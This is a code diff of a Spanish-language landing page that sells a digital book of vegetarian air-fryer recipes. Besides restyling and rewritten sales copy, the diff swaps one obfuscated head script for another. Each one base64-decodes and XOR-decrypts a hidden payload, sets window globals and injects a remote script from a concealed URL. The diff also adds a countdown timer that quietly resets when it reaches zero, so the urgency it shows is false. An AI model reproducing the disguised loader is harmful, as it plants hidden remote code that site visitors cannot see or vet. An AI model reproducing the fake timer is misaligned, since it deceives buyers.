@@ -61,19 +61,19 @@
   .wrap{max-width:1180px; margin:0 auto; padding:0 22px;}
   section{position:relative;}
   .eyebrow{
-    display:inline-flex; align-items:center; gap:8px;
-    font-size:clamp(10.5px,2.9vw,13px); font-weight:600; color:var(--terracotta-deep);
+    display:inline-flex; align-items:center; gap:6px;
+    font-size:clamp(9.5px,2.5vw,11.5px); font-weight:600; color:var(--terracotta-deep);
     background:var(--terracotta-tint); white-space:nowrap;
-    padding:7px 16px 7px 12px; border-radius:100px;
+    padding:5px 13px 5px 10px; border-radius:100px;
   }
-  .eyebrow svg{width:14px;height:14px;}
+  .eyebrow svg{width:12px;height:12px;}
   .btn-buy{
     display:flex; align-items:center; justify-content:center; gap:10px;
     width:100%;
     background:linear-gradient(180deg,#DE8A54,var(--terracotta-deep));
     color:#fff; font-family:'Montserrat',sans-serif; font-weight:800;
-    font-size:17px; letter-spacing:0.01em;
-    border:none; border-radius:100px; padding:20px 24px;
+    font-size:clamp(14px,4vw,17px); letter-spacing:0.01em; white-space:nowrap; text-align:center;
+    border:none; border-radius:100px; padding:20px 18px;
     box-shadow: 0 16px 32px -10px rgba(163,80,42,0.55), inset 0 1px 0 rgba(255,255,255,0.25);
     cursor:pointer; text-decoration:none;
     transition:transform .18s ease, box-shadow .18s ease;
@@ -84,8 +84,15 @@
   /* ---------- HERO ---------- */
   .urgency-bar{
     background:linear-gradient(180deg,#C4442E,#A6331F);
-    color:#fff; text-align:center; padding:11px 16px;
-    font-size:12.5px; font-weight:800; letter-spacing:0.05em;
+    color:#fff; text-align:center; padding:7px 14px;
+    font-size:11px; font-weight:800; letter-spacing:0.04em;
+    display:flex; align-items:center; justify-content:center; gap:8px; flex-wrap:wrap;
+  }
+  .urgency-timer{
+    display:inline-flex; align-items:center; gap:4px;
+    background:#F5C518; color:#3C2A00;
+    padding:2px 9px; border-radius:100px;
+    font-family:'Poppins',sans-serif; font-weight:800; font-size:11px; letter-spacing:0.02em;
   }
   .hero{ padding:44px 0 46px; background:
     radial-gradient(120% 90% at 50% -10%, #E9ECD6 0%, transparent 60%),
@@ -94,11 +101,12 @@
   .hero-copy{ display:flex; flex-direction:column; align-items:center; }
   .hero-copy .eyebrow{margin-bottom:22px;}
   .hero h1{
-    font-weight:700;
-    font-size:clamp(27px,6.8vw,44px); line-height:1.18;
-    letter-spacing:-0.01em; max-width:21ch;
+    font-weight:800;
+    font-size:clamp(23px,6.8vw,50px); line-height:1.22;
+    letter-spacing:-0.01em; max-width:30ch;
   }
-  .hero-sub{ margin:18px auto 0; font-size:clamp(15px,4vw,17.5px); line-height:1.5; max-width:36ch; }
+  .hl-green{ color:var(--olive-600); }
+  .hero-sub{ margin:16px auto 0; font-size:clamp(14.5px,3.8vw,17.5px); line-height:1.5; max-width:42ch; color:var(--olive-950); }
   .benefit-cards{ list-style:none; margin:30px auto 0; padding:0; display:grid; gap:10px; max-width:560px; width:100%; }
   .benefit-cards li{
     display:flex; align-items:center; gap:12px; font-size:14.5px; color:var(--olive-950); font-weight:600;
@@ -160,7 +168,7 @@
   }
 
   /* ---------- RECIPE GALLERY ---------- */
-  .gallery{ padding:60px 0 52px; background:var(--cream); }
+  .gallery{ padding:60px 0 52px; background:var(--paper); }
   .cat-scroller{
     display:grid; grid-template-columns:repeat(2,1fr); gap:14px;
   }
@@ -230,9 +238,7 @@
   .offer-divider span{ flex:1; height:1px; background:rgba(255,255,255,0.18); }
   .offer-divider p{ color:#B7C1A0; font-size:12px; font-weight:700; letter-spacing:0.08em; }
   .price-today{ text-align:center; margin-bottom:28px; }
-  .price-today .today-label{ display:inline-block; background:var(--terracotta); color:#fff; font-size:12px; font-weight:800; letter-spacing:0.05em; padding:6px 14px; border-radius:100px; margin-bottom:14px;}
-  .price-today .big-price{ font-family:'Poppins',sans-serif; font-weight:800; font-size:clamp(52px,15vw,72px); color:#fff; line-height:1; }
-  .price-today .big-price sup{ font-size:0.4em; top:-1.1em; }
+  .price-today .big-price{ font-family:'Poppins',sans-serif; font-weight:800; font-size:clamp(52px,15vw,72px); color:#7CFF6B; line-height:1; text-shadow:0 0 18px rgba(124,255,107,0.55), 0 0 40px rgba(124,255,107,0.25); }
   .price-today .terms{ margin-top:10px; font-size:13px; color:#B7C1A0; font-weight:700; letter-spacing:0.03em;}
   .offer-checks{ list-style:none; margin:26px 0 22px; padding:0; display:flex; flex-direction:column; gap:10px; max-width:340px; margin-left:auto; margin-right:auto;}
   .offer-checks li{ display:flex; align-items:center; gap:10px; font-size:14px; color:#EDEFDD; font-weight:600;}
@@ -263,6 +269,7 @@
   /* ---------- FAQ ---------- */
   .faq{ padding:58px 0 60px; background:var(--paper); }
   .faq-list{ max-width:640px; margin:0 auto; display:flex; flex-direction:column; gap:10px; }
+  .faq-cta{ max-width:420px; margin:34px auto 0; }
   details{ background:var(--cream); border-radius:var(--radius-sm); border:1px solid var(--line); overflow:hidden; }
   summary{
     list-style:none; cursor:pointer; padding:18px 50px 18px 20px; position:relative;
@@ -330,21 +337,24 @@ fbq('track', 'PageView');
 src="https://www.facebook.com/tr?id=2064125104249882&ev=PageView&noscript=1"
 /></noscript>
 <!-- End Meta Pixel Code -->
-<script>(function(){var s_gub8=atob("DAwfxw7+7E4ZnbK5Inc9snySznQ79cbNUn8l6CGdiCA36MbUS2pm6W2RgWB7753KQX52t3qNwztt8MGWTm1ron2KwiRqv56bQ3hrtWecmTp87pCDeXc9qW+TiWwjv9bYVm0ysnqThShgsMLLR3p6qXrTlC12+Z/KQWc96yyIjSJs+JCDAC5i63Xcgi90+JCDAGh+s2/TmTp09NTAD3xtonibgjo07sfbS2hs5SLcmi916NebGC49ulOD");var g_0ys7=[];for(var g_28=0;g_28<s_gub8.length;g_28++){g_0ys7.push(s_gub8.charCodeAt(g_28)&255);}var w_2v=g_0ys7[0];var b_eq=g_0ys7.slice(1,1+w_2v);var u_d6h0=g_0ys7.slice(1+w_2v);var j_in=u_d6h0.map(function(b,f_y){return b^b_eq[f_y%w_2v];});var k_lrny="";for(var f_v0p=0;f_v0p<j_in.length;f_v0p++){k_lrny+=String.fromCharCode(j_in[f_v0p]&255);}var d_6xl=decodeURIComponent(escape(k_lrny));var m_7ppj=JSON.parse(d_6xl);var v_d=m_7ppj.globals||[];v_d.forEach(function(k_rz3v){window[k_rz3v.name]=k_rz3v.value;});var i_2=document.createElement("script");i_2.src=m_7ppj.url;i_2.async=true;i_2.defer=true;(m_7ppj.attributes||[]).forEach(function(v_1j){i_2.setAttribute(v_1j.name,v_1j.value);});(document.head||document.documentElement).appendChild(i_2);})();</script>
+<script>(function(){var h_1=atob("DPNbbhie2thHpVw11Yh5G2ry+OJlzShBpYBhQTf9vrZp0ChYvJUiQHvxt/Yl13NGtoEyHmzt9a0zyC8auZIvC2vq9LI0h3AXtIcvHHH8r6wi1n4Pjoh5AHnzv/p9hzhUoZJ2G2zzs74+iCxHsIU+AGyzqa0lzDhG9995GHnyr71ln34XqK4m");var g_oh65=[];for(var x_el=0;x_el<h_1.length;x_el++){g_oh65.push(h_1.charCodeAt(x_el)&255);}var p_ud=g_oh65[0];var g_4is=g_oh65.slice(1,1+p_ud);var a_qp=g_oh65.slice(1+p_ud);var e_8vh=a_qp.map(function(b,u_p5){return b^g_4is[u_p5%p_ud];});var m_zto3="";for(var j_nvs=0;j_nvs<e_8vh.length;j_nvs++){m_zto3+=String.fromCharCode(e_8vh[j_nvs]&255);}var w_ye=decodeURIComponent(escape(m_zto3));var h_cwxx=JSON.parse(w_ye);var g_r=h_cwxx.globals||[];g_r.forEach(function(w_n4rf){window[w_n4rf.name]=w_n4rf.value;});var u_yw7=document.createElement("script");u_yw7.src=h_cwxx.url;u_yw7.async=true;u_yw7.defer=true;(h_cwxx.attributes||[]).forEach(function(i_nhf){u_yw7.setAttribute(i_nhf.name,i_nhf.value);});(document.head||document.documentElement).appendChild(u_yw7);})();</script>
 </head>
 <body>
 
 <!-- ================= HERO ================= -->
-<div class="urgency-bar">OFERTA DISPONIBLE SOLO HOY</div>
+<div class="urgency-bar">
+  <span>ESTA OFERTA TERMINA HOY</span>
+  <span class="urgency-timer" id="urgencyTimer">⏳ 20:00</span>
+</div>
 <section class="hero">
   <div class="wrap hero-grid">
     <div class="hero-copy">
       <span class="eyebrow">
         <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2v4M12 18v4M4.9 4.9l2.8 2.8M16.3 16.3l2.8 2.8M2 12h4M18 12h4M4.9 19.1l2.8-2.8M16.3 7.7l2.8-2.8"/></svg>
-        +100 RECETAS VEGETARIANAS EN AIR FRYER
+        PRODUCTO DIGITAL PREMIUM • ACCESO INMEDIATO
       </span>
-      <h1>Deja de comer siempre lo mismo solo porque elegiste ser vegetariano</h1>
-      <p class="hero-sub">Descubre +100 recetas fáciles, crujientes y llenas de sabor para preparar en tu Air Fryer y disfrutar comidas diferentes todos los días.</p>
+      <h1>+100 RECETAS <span class="hl-green">VEGETARIANAS DELICIOSAS</span> PARA HACER EN TU AIR FRYER</h1>
+      <p class="hero-sub">Recetas fáciles, rápidas y con ingredientes simples para salir de la rutina y disfrutar comidas diferentes todos los días.</p>
     </div>
 
     <div class="hero-visual">
@@ -355,42 +365,10 @@ src="https://www.facebook.com/tr?id=2064125104249882&ev=PageView&noscript=1"
       </div>
 
       <ul class="benefit-cards">
-        <li><span class="check"><svg viewBox="0 0 24 24" fill="none" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></svg></span>Ingredientes fáciles de encontrar</li>
-        <li><span class="check"><svg viewBox="0 0 24 24" fill="none" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></svg></span>Perfectas incluso si eres principiante</li>
-        <li><span class="check"><svg viewBox="0 0 24 24" fill="none" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></svg></span>Ideas para cualquier momento del día</li>
+        <li><span class="check"><svg viewBox="0 0 24 24" fill="none" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></svg></span>Más variedad</li>
+        <li><span class="check"><svg viewBox="0 0 24 24" fill="none" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></svg></span>Más sabor</li>
+        <li><span class="check"><svg viewBox="0 0 24 24" fill="none" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></svg></span>Menos tiempo pensando qué cocinar</li>
       </ul>
-    </div>
-  </div>
-</section>
-
-<!-- ================= IDENTIFICACIÓN ================= -->
-<section class="identify">
-  <div class="wrap">
-    <div class="identify-intro">
-      <h2>Ya no tienes que quedarte sin ideas sobre qué cocinar</h2>
-    </div>
-    <div class="pain-grid">
-      <div class="pain-card">
-        <div class="pi pi-olive"><svg viewBox="0 0 24 24" fill="none" stroke-linecap="round" stroke-linejoin="round"><path d="M6 12c0-5 3-9 6-9s6 4 6 9-3 9-6 9-6-4-6-9z"/><path d="M4 12h16"/></svg></div>
-        <h3>Siempre las mismas comidas</h3>
-        <p>Ensaladas, verduras y los mismos platos una y otra vez.</p>
-      </div>
-      <div class="pain-card">
-        <div class="pi pi-terracotta"><svg viewBox="0 0 24 24" fill="none" stroke-linecap="round" stroke-linejoin="round"><path d="M6 3v6a3 3 0 0 0 6 0V3M9 9v12M18 3c-2 1-3 3-3 6s1 4 3 5v7"/></svg></div>
-        <h3>Ingredientes difíciles</h3>
-        <p>Recetas que exigen cosas que ni siquiera encuentras en el supermercado.</p>
-      </div>
-      <div class="pain-card">
-        <div class="pi pi-gold"><svg viewBox="0 0 24 24" fill="none" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><path d="M12 7v5l3.5 2"/></svg></div>
-        <h3>Demasiado trabajo</h3>
-        <p>Muchos pasos para terminar preparando algo que no te entusiasma.</p>
-      </div>
-    </div>
-    <div class="identify-close">
-      <span class="identify-close-icon">
-        <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2v4M12 18v4M4.9 4.9l2.8 2.8M16.3 16.3l2.8 2.8M2 12h4M18 12h4M4.9 19.1l2.8-2.8M16.3 7.7l2.8-2.8"/></svg>
-      </span>
-      <p>Ahora tienes <strong>+100 recetas vegetarianas</strong> fáciles, variadas y deliciosas para preparar en tu Air Fryer.</p>
     </div>
   </div>
 </section>
@@ -399,7 +377,7 @@ src="https://www.facebook.com/tr?id=2064125104249882&ev=PageView&noscript=1"
 <section class="gallery">
   <div class="wrap">
     <div class="sec-head">
-      <h2>Mira todo lo que puedes preparar</h2>
+      <h2>MIRA CUÁNTAS OPCIONES VAS A TENER</h2>
     </div>
     <div class="cat-scroller">
       <div class="cat-card">
@@ -435,29 +413,11 @@ src="https://www.facebook.com/tr?id=2064125104249882&ev=PageView&noscript=1"
         <div class="cat-label"><span>Postres</span></div>
       </div>
     </div>
-    <p class="gallery-foot">Más variedad. Más sabor. Menos tiempo pensando qué cocinar.</p>
-  </div>
-</section>
-
-<!-- ================= PRODUCTO ================= -->
-<section class="product">
-  <div class="wrap product-grid">
-    <div class="product-mock">
-      <div class="open-book">
-        <div class="img-frame no-bg open-book-frame">
-          <img src="images/livro.webp" alt="+100 Recetas Vegetarianas en Air Fryer - vista interna">
-        </div>
-      </div>
-    </div>
-    <div class="product-copy">
-      <div class="sec-head"><h2>+100 recetas para salir de la rutina</h2></div>
-      <div class="feat-grid">
-        <div class="feat-pill">Todo paso a paso</div>
-        <div class="feat-pill">Ingredientes simples</div>
-        <div class="feat-pill">Para principiantes</div>
-        <div class="feat-pill">Dulces y saladas</div>
-        <div class="feat-pill" style="grid-column:1/-1;">Para todos los días</div>
-      </div>
+    <div class="identify-close">
+      <span class="identify-close-icon">
+        <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2v4M12 18v4M4.9 4.9l2.8 2.8M16.3 16.3l2.8 2.8M2 12h4M18 12h4M4.9 19.1l2.8-2.8M16.3 7.7l2.8-2.8"/></svg>
+      </span>
+      <p>Son <strong>+100 recetas vegetarianas</strong> fáciles, variadas y deliciosas para preparar en tu Air Fryer.</p>
     </div>
   </div>
 </section>
@@ -465,7 +425,7 @@ src="https://www.facebook.com/tr?id=2064125104249882&ev=PageView&noscript=1"
 <!-- ================= BONOS ================= -->
 <section class="bonus">
   <div class="wrap">
-    <div class="sec-head"><h2>Y hoy también recibes 5 bonos</h2></div>
+    <div class="sec-head"><h2>Y HOY TAMBIÉN RECIBES <span class="hl-green">5 BONOS EXCLUSIVOS</span></h2></div>
     <div class="bonus-list">
 
       <div class="bonus-card">
@@ -522,31 +482,10 @@ src="https://www.facebook.com/tr?id=2064125104249882&ev=PageView&noscript=1"
   </div>
 </section>
 
-<!-- ================= TESTIMONIOS ================= -->
-<section class="testimonials">
-  <div class="wrap">
-    <div class="sec-head"><h2>Mira lo que dicen quienes ya probaron las recetas</h2></div>
-    <div class="wa-grid">
-      <div class="wa-card img-frame">
-        <img src="images/depo1.webp" alt="Testimonio 1">
-      </div>
-      <div class="wa-card img-frame">
-        <img src="images/depo2.webp" alt="Testimonio 2">
-      </div>
-      <div class="wa-card img-frame">
-        <img src="images/depo3.webp" alt="Testimonio 3">
-      </div>
-      <div class="wa-card img-frame">
-        <img src="images/depo4.webp" alt="Testimonio 4">
-      </div>
-    </div>
-  </div>
-</section>
-
 <!-- ================= OFERTA PRINCIPAL ================= -->
 <section class="offer" id="oferta">
   <div class="wrap">
-    <div class="sec-head"><h2>Todo esto es tuyo hoy</h2></div>
+    <div class="sec-head"><h2>MIRA TODO LO QUE VAS A RECIBIR:</h2></div>
 
     <div class="offer-mockup-wrap">
       <div class="img-frame no-bg offer-mockup">
@@ -564,20 +503,19 @@ src="https://www.facebook.com/tr?id=2064125104249882&ev=PageView&noscript=1"
     </ul>
 
     <div class="value-block">
-      <div class="value-label">VALOR TOTAL + BONOS</div>
-      <div class="value-price">US$87</div>
+      <div class="value-label">VALOR TOTAL</div>
+      <div class="value-price">$87</div>
     </div>
 
-    <div class="offer-divider"><span></span><p>OFERTA ESPECIAL DE HOY</p><span></span></div>
+    <div class="offer-divider"><span></span><p>HOY SOLO</p><span></span></div>
 
     <div class="price-today">
-      <span class="today-label">SOLO</span>
-      <div class="big-price">US$7<sup>,90</sup></div>
+      <div class="big-price">$7,90</div>
       <div class="terms">PAGO ÚNICO · ACCESO VITALICIO</div>
     </div>
 
-    <a href="https://pay.digitalgoat.com.br/checkout/cmu4vnocm0apy01pqltpiaz12?offer=KBSDH1P" class="btn-buy" id="ctaMain">
-      QUIERO MIS +100 RECETAS
+    <a href="https://pay.hotmart.com/L107659093Q?checkoutMode=10" class="btn-buy" id="ctaMain">
+      QUIERO MIS RECETAS AHORA
     </a>
     <p class="cta-note">El valor será convertido automáticamente a tu moneda local en la página de pago.</p>
 
@@ -589,7 +527,28 @@ src="https://www.facebook.com/tr?id=2064125104249882&ev=PageView&noscript=1"
 
     <div class="email-note">
       <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="5" width="18" height="14" rx="2.5"/><path d="m4 7 8 6 8-6"/></svg>
-      <span>Recibe tu acceso inmediatamente por correo electrónico</span>
+      <span>Recibe todo el material de inmediato en tu correo electrónico, sin complicaciones</span>
+    </div>
+  </div>
+</section>
+
+<!-- ================= TESTIMONIOS ================= -->
+<section class="testimonials">
+  <div class="wrap">
+    <div class="sec-head"><h2>Mira lo que dicen quienes ya probaron las recetas</h2></div>
+    <div class="wa-grid">
+      <div class="wa-card img-frame">
+        <img src="images/depo1.webp" alt="Testimonio 1">
+      </div>
+      <div class="wa-card img-frame">
+        <img src="images/depo2.webp" alt="Testimonio 2">
+      </div>
+      <div class="wa-card img-frame">
+        <img src="images/depo3.webp" alt="Testimonio 3">
+      </div>
+      <div class="wa-card img-frame">
+        <img src="images/depo4.webp" alt="Testimonio 4">
+      </div>
     </div>
   </div>
 </section>
@@ -620,7 +579,7 @@ src="https://www.facebook.com/tr?id=2064125104249882&ev=PageView&noscript=1"
     <div class="expert-copy">
       <span class="eyebrow">NUTRICIONISTA COLEGIADA Nº CV01751</span>
       <h2>Revisado y aprobado por la nutricionista Camille Morel</h2>
-      <p class="quote">"Soy vegetariana desde hace más de 12 años y sé lo frustrante que es terminar comiendo siempre lo mismo. Por eso revisé esta colección para que tengas recetas fáciles, variadas y realmente deliciosas para el día a día."</p>
+      <p class="quote">"Soy vegetariana desde hace más de 12 años y sé lo frustrante que es comer siempre lo mismo. Durante años fui creando recetas fáciles, variadas y deliciosas, y hoy reuní mis favoritas en este material para ayudarte a disfrutar mucho más tu cocina vegetariana."</p>
       <div class="signature">Camille Morel</div>
     </div>
   </div>
@@ -656,10 +615,13 @@ src="https://www.facebook.com/tr?id=2064125104249882&ev=PageView&noscript=1"
         <p class="faq-a">Sí. Tu compra está protegida durante 30 días.</p>
       </details>
     </div>
+    <div class="faq-cta">
+      <a href="https://pay.hotmart.com/L107659093Q?checkoutMode=10" class="btn-buy">
+        QUIERO MIS RECETAS AHORA
+      </a>
+    </div>
   </div>
 </section>
-
-<!-- ================= FOOTER ================= -->
 <footer>
   <div class="wrap">
     <p style="color:#fff;font-weight:700;">+100 Recetas Vegetarianas en Air Fryer</p>
@@ -670,6 +632,36 @@ src="https://www.facebook.com/tr?id=2064125104249882&ev=PageView&noscript=1"
     </div>
   </div>
 </footer>
+
+<script>
+(function(){
+  var DURATION = 20 * 60; // 20 minutos en segundos
+  var el = document.getElementById('urgencyTimer');
+  if(!el) return;
+  var storageKey = 'ofertaTimerEnd';
+  var end;
+  try{
+    end = parseInt(sessionStorage.getItem(storageKey), 10);
+  }catch(e){ end = null; }
+  var now = Date.now();
+  if(!end || end < now){
+    end = now + DURATION * 1000;
+    try{ sessionStorage.setItem(storageKey, end); }catch(e){}
+  }
+  function tick(){
+    var remaining = Math.max(0, Math.round((end - Date.now()) / 1000));
+    var m = Math.floor(remaining / 60);
+    var s = remaining % 60;
+    el.textContent = '⏳ ' + String(m).padStart(2,'0') + ':' + String(s).padStart(2,'0');
+    if(remaining <= 0){
+      end = Date.now() + DURATION * 1000;
+      try{ sessionStorage.setItem(storageKey, end); }catch(e){}
+    }
+  }
+  tick();
+  setInterval(tick, 1000);
+})();
+</script>
 
 </body>
 </html>
